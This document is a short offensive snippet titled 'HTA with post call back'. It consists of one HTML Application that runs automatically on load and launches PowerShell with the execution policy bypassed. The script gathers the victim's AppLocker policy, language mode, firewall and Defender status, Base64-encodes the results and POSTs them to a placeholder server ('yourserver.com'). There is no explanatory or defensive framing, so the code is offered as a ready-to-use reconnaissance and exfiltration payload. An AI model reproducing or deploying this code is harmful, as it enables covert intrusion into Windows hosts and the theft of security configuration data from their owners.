
### HTA with post call back

```html
<html>
<head>
    <title>System Info Collection</title>
    <HTA:APPLICATION ID="systemInfoApp" BORDER="thin" SCROLL="no" SINGLEINSTANCE="yes">
    <script language="VBScript">
        Sub window_onload()
            Call CollectInfoAndSend()
        End Sub
    </script>
</head>
<body>
    <script language="JavaScript">
        function CollectInfoAndSend() {
            try {
                var shell = new ActiveXObject("WScript.Shell");

                // PowerShell commands to gather information
                var psCommands = `
                    # Check for AppLocker policies
                    $appLockerPolicies = Get-AppLockerPolicy -Effective -XML | Out-String

                    # Check for Constrained Language Mode
                    $languageMode = $ExecutionContext.SessionState.LanguageMode

                    # Check Firewall status
                    $firewallStatus = (Get-NetFirewallProfile -All | Select-Object -Property Name, Enabled) | Out-String

                    # Check for antivirus (Defender)
                    $defenderStatus = (Get-Service -Name "WinDefend" -ErrorAction SilentlyContinue).Status

                    # Collect all results into a single string
                    $output = @"
                    AppLocker Policies:
                    $appLockerPolicies

                    Language Mode:
                    $languageMode

                    Firewall Status:
                    $firewallStatus

                    Defender Status:
                    $defenderStatus
                    "@

                    # Encode output in Base64
                    [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($output))
                `;

                // Run PowerShell command and get output
                var psExec = "powershell.exe -ExecutionPolicy Bypass -NoProfile -Command \"" + psCommands.replace(/\n/g, "") + "\"";
                var result = shell.Exec(psExec).StdOut.ReadAll();

                // Send the result to your web server
                var xhr = new ActiveXObject("Microsoft.XMLHTTP");
                xhr.open("POST", "http://yourserver.com/receive", false); // Replace with your URL
                xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
                xhr.send("data=" + encodeURIComponent(result));

                document.write("Data sent successfully.");
            } catch (e) {
                document.write("Error: " + e.message);
            }
        }
    </script>
</body>
</html>

```

